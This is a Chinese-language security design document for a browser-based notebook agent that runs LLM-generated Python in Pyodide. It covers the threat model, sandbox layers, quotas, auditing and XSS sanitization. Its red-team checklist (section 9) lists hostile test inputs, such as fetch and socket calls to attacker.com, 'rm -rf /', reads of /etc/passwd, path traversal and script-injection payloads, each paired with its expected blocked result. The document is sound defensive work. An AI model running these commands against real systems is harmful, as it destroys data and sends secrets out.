# 安全模型

本文档定义 Notebook Agent 的威胁模型、纵深防御策略、运行时约束、红队验证清单。

---

## 1. 威胁模型

### 1.1 我们防什么

| 威胁 | 来源 | 后果 | M1 是否覆盖 |
|------|------|------|------------|
| **意外破坏** | LLM 生成的代码意外删错文件 / 死循环 | workspace 文件丢失、UI 卡顿 | ✅ |
| **资源耗尽** | 死循环、内存炸弹、写满 OPFS | tab 卡死、用户其他工作受影响 | ✅ |
| **数据外泄** | 代码主动 / prompt injection 后向外发数据 | 用户数据泄露 | ✅ |
| **xss / 同源攻击** | 渲染 Agent 生成的 Markdown / 图表 | 主站 JS 上下文被污染 | ✅ |
| **iframe 逃逸** | 通过 postMessage 伪造请求侵入主站 | 主站状态被篡改 | ✅ |
| **横向移动** | 从 Notebook 跳到其他 session 的 OPFS | 跨 session 数据泄漏 | ✅ |
| **WASM 沙箱逃逸** | V8 / wasm 0day | 浏览器进程被攻陷 | ⚠️ 非我方控制（同等 V8 RCE 难度）|
| **供应链** | Pyodide 包被替换、被注入恶意代码 | 后门 | ✅ 自托管 + SRI |

### 1.2 我们不防什么

- **机主自己的恶意行为**：Notebook 设计假设 Agent 是被使用的工具，机主对自己的浏览器 / 数据负责
- **企业级网络监听**：DLP、企业代理、企业 EDR 等不是我们能控制的
- **物理访问**：用户离开机器后他人坐过来用 → 这是机主自己的操作环境责任

### 1.3 安全水位定位

> **同等于"用户在浏览器打开任何 SaaS 网站"的安全水位 + 我方做的纵深防御**。

适用部署场景：

- ✅ 桌面 / 内网 / 私有部署
- ✅ 企业内网多用户分析
- ✅ 公网 SaaS（受 V8 wasm 沙箱整体水位约束，与"在 Codepen 上跑代码"同档）

## 2. 纵深防御层级

```
┌────────────────────────────────────────────────────────────┐
│ L6  审计与监控（前端落日志，关键事件上报后端）              │
├────────────────────────────────────────────────────────────┤
│ L5  业务层超时与配额（exec / OPFS / 工具调用次数）          │
├────────────────────────────────────────────────────────────┤
│ L4  Worker 能力剥夺（fetch / XHR / WS / IDB / caches 全删） │
├────────────────────────────────────────────────────────────┤
│ L3  Pyodide jsglobals 锁定（Python 拿不到 globalThis）      │
├────────────────────────────────────────────────────────────┤
│ L2  iframe 边界（COOP/COEP；postMessage 来源校验）          │
├────────────────────────────────────────────────────────────┤
│ L1  WASM 沙箱（无 syscall；V8 工程化加固）                 │
└────────────────────────────────────────────────────────────┘
```

每层独立失效都不应导致整体失守。

## 3. L1：WASM 沙箱（自带）

WASM 在浏览器中天生没有：

- 直接的系统调用（`os.system`、`socket.connect` 等在 Pyodide 里被映射成虚拟实现或抛错）
- 真实文件系统访问（Pyodide 的 FS 是 emscripten 虚拟实现）
- 进程 / 线程创建能力（无 fork、无 exec）
- 任意内存访问（WASM 线性内存隔离）

这是**地基**：Python 代码层做不到的事，加多少其他防御都无意义。

## 4. L2：iframe 边界

### 4.1 Cross-Origin Isolation

主站对 `/notebook.html` 路径返回：

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

效果：

- iframe 内 `crossOriginIsolated === true`
- SharedArrayBuffer 可用（用于 Worker 中断）
- 任何跨域资源（图片、字体、第三方 iframe）必须带 `Cross-Origin-Resource-Policy` 头才能被加载——M1 笔记本不引用任何跨域资源，安全

详细配置见 [部署与构建 §3](部署与构建.md#3-coopcoep-头).

### 4.2 postMessage 来源校验

主站和 iframe 接收 message 时强校验 `event.source`：

```typescript
// 主站
window.addEventListener('message', (event) => {
  if (event.source !== iframeRef.value?.contentWindow) {
    console.warn('丢弃来源不明的 message')
    return
  }
  // ...
})

// iframe
window.addEventListener('message', (event) => {
  if (event.source !== window.parent) {
    console.warn('丢弃来源不明的 message')
    return
  }
  // ...
})
```

不依靠 `event.origin`（同源时 origin 相同，区分不了；跨子域 origin 也可被欺骗），用 source 强校验。

### 4.3 协议 schema 强校验

收到 message 后用 Zod / 自定义 validator 强校验：

```typescript
const validatedRequest = ParentBridgeRequestSchema.parse(event.data)
// 任何字段缺失 / 类型不符 → 抛错
```

### 4.4 iframe sandbox 与 Permissions-Policy

决策 Q15：**不加 sandbox**（同源 iframe 加了反而限制 OPFS 共享）。

但加 `Permissions-Policy` 收紧不需要的能力（M2 落实）：

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), serial=()
```

## 5. L3：Pyodide jsglobals 锁定

**最关键的一层防御**——Pyodide on Browser 默认让 Python 通过 `from js import ...` 访问 Worker 的全部 globalThis。

### 5.1 启动时锁定

```typescript
// Worker 内
import { loadPyodide } from 'pyodide'

const safeJsGlobals = {
  // 显式暴露的最少能力
  console: {
    log: (...args: unknown[]) => self.postMessage({ kind: 'log', args }),
  },
}

const pyodide = await loadPyodide({
  indexURL: '/pyodide/v0.27/',
  packages: defaultPackages,
  jsglobals: safeJsGlobals,           // ← 关键
  fullStdLib: false,                   // 减少攻击面
  stdout: handleStdout,
  stderr: handleStderr,
})

// 进一步：摘掉 Pyodide 默认提供的 pyfetch 等
await pyodide.runPythonAsync(`
import sys
# pyodide.http 可能让 Python 通过 JS fetch 发起请求
if 'pyodide' in sys.modules:
    pyodide_mod = sys.modules['pyodide']
    if hasattr(pyodide_mod, 'http'):
        del pyodide_mod.http
# pyodide.ffi 仍然保留（Pyodide 内部需要），但 from js import 已被 jsglobals 限制
`)
```

### 5.2 jsglobals 实现细节

- 仅暴露 `console`（用于 Python `print` 兜底；正常走 sys.stdout 重定向，不需要 console）
- **不暴露** `process`、`require`、`fetch`、`globalThis`、`self`
- **不暴露** Pyodide 对象本身（防止 Python 拿到 `pyodide.FS.mount` 重挂别的目录）
- jsglobals 必须是 plain object，不是 Proxy

### 5.3 MEMFS / OPFS 文件系统隔离（最终方案）

Pyodide 启动后，**只创建四个顶级目录**（`inputs/scripts/artifacts/reports`）在 Worker 内的 **MEMFS** 上，不直接挂 OPFS：

```typescript
// Worker 内 pyodideBoot.bootPyodide：
// 只在 MEMFS 上 mkdirTree，不 mount 任何后端
for (const dir of ['inputs', 'scripts', 'artifacts', 'reports']) {
  pyodide.FS.mkdirTree(`/${dir}`)
}
```

- **真实持久层 = OPFS**：由 iframe 主线程异步读写（`opfsAccess.ts`），Pyodide **看不到** OPFS。
- **Python 可见层 = MEMFS**：Pyodide 只能读写 Worker 进程内的虚拟 FS。
- **入向 sync**：`parent.import_csv` / 初始化时由主线程把 OPFS 字节灌进 MEMFS（`workerHost.writeFs`）。
- **出向 sync**：`python_exec_*` 后主线程 `snapshotFs` 拉 MEMFS 变更回写 OPFS（详见 架构与数据流.md §3.4）。
- 其他路径：`/`、`/usr`、`/lib`、`/proc` 等是 Pyodide 内置 MEMFS（虚拟），仅含 stdlib。
- 不挂载浏览器 Cache Storage、IndexedDB、localStorage、sessionStorage。
- Python 写 `/etc/passwd` 写不到任何真实文件（红队 #4）。
- Python 写 `/workspace/...`（非四个顶级目录）也落不到 OPFS。

## 6. L4：Worker 能力剥夺

### 6.1 启动后立即剥夺

```typescript
// Worker 启动后第一件事，先于 loadPyodide
declare const self: WorkerGlobalScope & { [key: string]: unknown }

// 先记下白名单需要保留的引用
const allowedFetch = self.fetch  // 仅用于 Pyodide 加载本地 wheel
const allowedOpfsAPI = self.navigator?.storage  // OPFS 入口

// 删能力
self.fetch = (() => {
  throw new Error('外部网络访问已禁用')
}) as typeof fetch
delete (self as any).XMLHttpRequest
delete (self as any).WebSocket
delete (self as any).EventSource
delete (self as any).indexedDB
delete (self as any).caches
delete (self as any).Notification
delete (self as any).BroadcastChannel
delete (self as any).clients

// 注意：crypto / performance / postMessage 保留
```

### 6.2 Pyodide 加载阶段的 fetch 例外

Pyodide 自己加载 wheel 包时需要 fetch。在 loadPyodide 的临时窗口内允许同源 fetch：

```typescript
let pyodideLoading = true
self.fetch = (async (input: RequestInfo, init?: RequestInit) => {
  if (!pyodideLoading) {
    throw new Error('外部网络访问已禁用')
  }
  const url = typeof input === 'string' ? input : input.url
  const allowedPrefix = '/pyodide/v0.27/'
  if (!url.startsWith(allowedPrefix)) {
    throw new Error(`只允许加载 ${allowedPrefix} 下资源，得到 ${url}`)
  }
  return allowedFetch.call(self, input, init)
}) as typeof fetch

const pyodide = await loadPyodide(...)

// 加载完毕，关闭窗口
pyodideLoading = false
self.fetch = (() => {
  throw new Error('外部网络访问已禁用')
}) as typeof fetch
```

### 6.3 micropip 行为约束

M1：完全禁用 micropip（system prompt 不告诉 Agent 这个工具，且 fetch 已经关）。

M2 放开：

- 维护一份白名单包清单（`numpy/pandas/scipy/sklearn/matplotlib/seaborn/statsmodels/duckdb/pyarrow/networkx/...`）
- 安装时临时打开 fetch 白名单（仅 jsdelivr/PyPI 路径）
- 包名不在白名单 → 抛错
- 安装记录写 `audit.jsonl`

## 7. L5：业务层超时与配额

### 7.1 单次 exec

| 类型 | 默认 | 上限 | 触发 |
|------|------|------|------|
| 软超时 | 60s | 300s（用户可在 timeoutMs 参数中调） | SIGINT |
| 硬超时 | 90s | 软超时 + 30s | worker.terminate() |

### 7.2 OPFS 配额

| 维度 | 限制 |
|------|------|
| 单 session 总写入 | 500MB |
| 单 fs_write 调用 | ≤ 50MB（防一次性写大）|
| inputs/ 启动数据 | ≤ 200MB（postMessage 实际上限）|

实施：

```typescript
const writtenBytes = new Map<string, number>()  // sessionId → 已写字节

const checkQuota = async (sessionId: string, addBytes: number) => {
  const current = writtenBytes.get(sessionId) ?? 0
  const QUOTA = 500 * 1024 * 1024
  if (current + addBytes > QUOTA) {
    throw new ToolError('quota_exceeded', '已达 session 配额上限 500MB')
  }
  // 偶尔同步 navigator.storage.estimate() 校准
  if (Math.random() < 0.1) {
    const est = await navigator.storage.estimate()
    // ...
  }
}
```

### 7.3 工具调用次数（决策 Q17：不限总预算）

M1 不强制单 session 工具调用上限（依赖 LLM token 上限作为天然预算）。

但 UI 上**必须**展示"已运行 N 次 exec / 累计耗时 M 分钟"，让用户能在感觉异常时手动停止。

## 8. L6：审计与监控

### 8.1 前端落日志

iframe 内维护一个 ring buffer（最多 500 条），记录：

```typescript
type AuditEntry =
  | { ts: string; kind: 'exec_start'; execId: string; codeHash: string; codeLen: number }
  | { ts: string; kind: 'exec_done'; execId: string; status: string; elapsedMs: number }
  | { ts: string; kind: 'fs_write'; path: string; bytes: number }
  | { ts: string; kind: 'fs_edit'; path: string; replacements: number }
  | { ts: string; kind: 'tool_error'; tool: string; code: string }
  | { ts: string; kind: 'worker_restart'; reason: string }
  | { ts: string; kind: 'quota_hit'; current: number; limit: number }
```

注意：

- **不记录代码全文**（隐私 + 体积），只记 SHA-256 hash + 长度
- **不记录数据值**

### 8.2 关键事件上报

特定事件主动 POST 到 `/api/notebook-agent/sessions/:id/audit`：

- `worker_restart`
- `quota_hit`
- 连续 5 次 `tool_error`
- session 结束时上报全部审计 buffer

后端持久化用于事后排查。

### 8.3 用户可见状态

UI 必须随时让用户看到：

- 当前 Worker 状态（loading / ready / running / failed）
- 已运行 exec 数 / 当前 exec 时长
- workspace 已用 / 配额
- 最近一次错误（如有）

## 9. 红队验证清单

每条对应一项防御。**M1 上线前必须自动化通过此清单**。在 `tests/notebook-agent/security/` 落 vitest + Playwright 用例。

| # | 测试代码 / 场景 | 预期 | 对应防御 |
|---|---------------|------|---------|
| 1 | `from js import process` | ImportError 或 AttributeError | L3 jsglobals 锁定 |
| 2 | `from js import globalThis; globalThis.fetch('https://attacker.com')` | 抛错或 fetch 已被剥夺 | L3 + L4 |
| 3 | `import os; os.system('rm -rf /')` | OSError / NotImplementedError | L1 WASM 没 syscall |
| 4 | `open('/etc/passwd', 'r')` | FileNotFoundError | L3 NODEFS 仅挂 workspace |
| 5 | `open('/workspace/../../../etc/passwd', 'r')` | FileNotFoundError | L1 + workspace 边界 |
| 6 | fs_read 路径含 `..` | ToolError(`path_out_of_workspace`) | 路径校验 |
| 7 | fs_read 绝对路径 `/etc/passwd` | ToolError(`path_out_of_workspace`) | 路径校验 |
| 8 | `import socket; socket.create_connection(('attacker.com', 80))` | 抛错（Pyodide stub）| L1 |
| 9 | python_exec_inline 跑 `while True: pass`，等 60s | 触发 SIGINT，status='interrupted' | L5 软超时 |
| 10 | python_exec_inline 在 C 扩展里 `np.linalg.solve(huge)`，无法 SIGINT | 90s 后 worker.terminate() | L5 硬超时 |
| 11 | python_exec_inline `[0]*10**12` | 触发 OOM，Worker 崩溃，自动重启 | Worker 隔离 |
| 12 | fs_write 写入 1GB 内容 | 50MB 单次上限 / 500MB 总上限触发 | L5 OPFS 配额 |
| 13 | 跨 session 越界（伪造 sessionId 试图读其他 session 的 OPFS）| 路径不在当前 session prefix 下 → 拒绝 | OPFS sessionId 隔离 |
| 14 | 主站收到来自 `event.source !== iframe` 的 message | 丢弃 | L2 来源校验 |
| 15 | 伪造 postMessage payload schema 不符 | Zod 校验失败，丢弃 | L2 schema 校验 |
| 16 | iframe 内 `parent.location` | 同源时仍能访问，但**没有可写入口**（主站不暴露任何全局 setter）| 主站不留接口 |
| 17 | Markdown 渲染含 `<script>alert(1)</script>` | 被 marked + 自定义 sanitizer 转义 | XSS |
| 18 | Markdown 渲染含 `<iframe src=javascript:...>` | 被 sanitizer 拦截 | XSS |
| 19 | M1 Agent 调 micropip.install("bad") | system prompt 没告知；强行调时抛错（无 fetch）| L4 fetch 剥夺 |
| 20 | Python 创建 100 个线程 | Pyodide 单线程，threading 是协程模拟 | L1 WASM |

## 10. Markdown / 图表渲染的 XSS 防护

Agent 写出的 `reports/main.md` 在主站文件预览面板渲染。**必须**走 sanitize：

```typescript
// src/notebook/preview/markdownRenderer.ts
import { marked } from 'marked'
import DOMPurify from 'dompurify'  // 需要新增依赖

export const renderMarkdownSafe = (md: string): string => {
  const rawHtml = marked.parse(md, { async: false }) as string
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: [
      'h1','h2','h3','h4','h5','h6','p','br','hr',
      'strong','em','del','code','pre','blockquote',
      'ul','ol','li','dl','dt','dd',
      'table','thead','tbody','tr','th','td',
      'a','img',
    ],
    ALLOWED_ATTR: ['href','src','alt','title','class'],
    ALLOWED_URI_REGEXP: /^(https?:|data:image\/(?:png|jpeg|svg\+xml)|\.\.?\/)/i,
  })
}
```

> 暂未引入 DOMPurify，PoC 阶段可先用 marked 自带 sanitizer + 自定义 walker。M1 必须有 sanitizer。

图片：

- `![](../artifacts/xxx.png)` → 主站从 OPFS 读取 → 转 blob URL → 替换 src
- `![](http://...)` → sanitizer 允许，但因 COEP 阻止跨域加载（图不显示，仅作降级）

ECharts JSON（M2）：

- 文件以 `.echarts.json` 结尾
- 主站读取后用 vue-echarts 渲染
- 渲染前用 zod 校验 spec 结构（拒绝包含 `formatter` 函数字符串的 spec —— 这是 ECharts 的潜在 XSS 入口）

## 11. 供应链：Pyodide 资源完整性

自托管 Pyodide 资源时：

### 11.1 Subresource Integrity (SRI)

主入口（`/pyodide/v0.27/pyodide.js`）通过 `<script integrity="sha384-...">` 引入。

PoC 阶段先不上 SRI（开发频繁）；M1 发布前必须加。

### 11.2 资源版本锁定

- Pyodide 版本锁定到 0.27.x（按 PoC 实测的具体版本）
- 升级流程：开发环境验证 → 跑红队清单 → 跑性能基线 → 进 release
- 版本号写进 `package.json` 的依赖（如果有 npm 包）+ `dist/pyodide/<version>/` 目录路径
- **不允许**在生产手工换包

### 11.3 完整性扫描

定期（CI）：

- 校验 `dist/pyodide/` 下所有文件 SHA-256 与 release 时锁定的清单一致
- Pyodide 官方版本发布时跟进 changelog 看是否有安全修复

## 12. 数据脱敏边界（与 Pi Agent 主链的协调）

Pi Agent 主链使用 `safePayload.ts` 脱敏画布数据再传给 LLM。Notebook Agent 的策略不同：

| 数据 | Pi Agent 主链 | Notebook Agent |
|------|--------------|---------------|
| 画布 NodeResult 摘要 | 脱敏 | M1 不在 LLM context 出现，仅作为 inputs/upstream.csv 入 OPFS |
| inputs/upstream.csv | n/a | **完整数据**进 OPFS，Agent 读 csv 时获得真实值 |
| Agent 在 stdout 里 print 数据 | n/a | 真实值出现在 stdout，回 LLM context |

**关键安全决定**：

- Notebook Agent 是"用户授权的数据分析"场景，需要真实数据才能分析
- 数据**留在浏览器**，不上传服务端（除非 audit 上报）
- LLM context 中出现的真实数据值是**Agent 主动 print 的**，不是系统强加的
- system prompt 告知 Agent："涉及 PII 的真实值（手机号、身份证）只在分析时短暂使用，不写入报告原文"

如果客户场景对 PII 极敏感（金融 / 医疗），M3 评估增加 "PII 检测中间件"：

- 在 fs_read CSV 时扫描列名匹配（phone / id_card / email 等模式）
- 命中时主动告知 Agent "此列为 PII，分析后请脱敏展示"
- 非强制屏蔽

## 13. 失效场景演练

事故等级与响应：

| 场景 | 等级 | 响应 |
|------|------|------|
| WASM 沙箱 0day（V8 RCE 见 CVE）| P0 | 紧急下线 Notebook 入口；通知所有用户；锁定 Pyodide / Chrome 版本 |
| Pyodide 包被替换（供应链）| P0 | SRI 触发自然失败；快速回滚；安全审计 |
| OPFS 配额机制失效（用户磁盘被打满）| P1 | 紧急修补；通知用户清理 |
| postMessage 协议被绕过（主站状态被篡改）| P1 | 修补 + 紧急发版；事后追溯 |
| 单用户大量调用导致前端卡顿 | P2 | 加更严的客户端节流 |

## 14. 与 Pi Agent 主链 safePayload 的关系

`src/server/piAgent/safePayload.ts` 在 Notebook Agent 的使用范围：

- ✅ 后端 SSE 推送 Pi Agent 推理事件时，Agent 内部 stdout / 工具返回的内容**仍然脱敏**（采用同样的 `sanitizePiAgentDataSources`）
- ✅ 后端审计日志写入时，剔除可能含 PII 的字段
- ❌ 前端 OPFS 中的 inputs/upstream.csv **不脱敏**（用户授权的数据，留在用户浏览器）
- ❌ Agent 在 stdout 中主动 print 的数据**不脱敏**（Agent 行为靠 system prompt 引导）

这个边界写到代码注释里，避免后续维护时混淆。
